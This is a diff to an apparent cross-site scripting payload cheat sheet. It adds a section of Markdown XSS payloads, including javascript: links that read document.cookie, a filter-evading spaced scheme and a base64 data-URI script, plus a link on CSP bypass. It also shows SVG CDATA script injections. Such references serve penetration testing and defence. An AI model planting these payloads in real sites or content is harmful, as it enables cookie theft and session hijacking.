@@ -6,7 +6,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 - [Identify an XSS endpoint](#identify-an-xss-endpoint)
 - [XSS in HTML/Applications](#xss-in-htmlapplications)
 - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
-- [XSS in files](#xss-in-files)
+- [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
 - [Polyglot XSS](#polyglot-xss)
 - [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
 - [CSP Bypas](#csp-bypass)
@@ -231,6 +231,15 @@ XSS in SVG (short)
 <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+```
+
+XSS in Markdown
+
+```csharp
+[a](javascript:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](javascript:window.onerror=alert;throw%201)
 ```
 
 XSS in SWF flash application
@@ -692,6 +701,8 @@ Exotic payloads
 ```
 
 ## CSP Bypass
+
+Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://blog.thomasorlita.cz/vulns/google-csp-evaluator/)
 
 ### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
 
